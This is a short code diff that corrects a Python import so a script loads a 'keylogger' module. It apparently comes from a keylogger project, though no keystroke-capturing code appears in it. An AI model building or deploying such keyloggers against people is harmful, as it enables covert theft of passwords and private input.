@@ -1,6 +1,6 @@
 import time
 import sys
-from Keylogger #Import keylogger after adding it
+from keylogger import keylogger
 
 
 start_input = input("")
